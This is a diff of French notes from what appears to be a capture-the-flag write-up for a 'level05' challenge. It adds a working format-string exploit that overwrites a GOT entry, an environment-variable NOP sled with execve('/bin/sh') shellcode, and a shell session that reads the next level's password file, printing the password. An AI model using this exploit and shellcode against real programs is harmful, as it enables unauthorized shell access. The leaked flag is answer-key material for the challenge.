@@ -84,13 +84,25 @@ Non-debugging symbols:
 C'est cette adresse : 0x80497e0
 
 
+Il faut enlever 8 a la valeur des higher and low bytes pour les 2 adresses rentrer dans la payload donc 
 
-python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55400x%10$hn" + "%10127x%11$hn"' | ./level05
-----> Pas bon a terminer
+
+0xffff = 65535 - 8 = 65527
+0xfff7 = 65527
+
+Ensuite repartie sur les lower et higher bytes donc 56401 + 9126 = 65527
+
+
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56401x%10$hn" + "%9126x%11$hn")'; cat) | env -i SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') ./level05
 
 ------
- 
-  ...
-  h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+ls
+ls: cannot open directory .: Permission denied
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
 
 
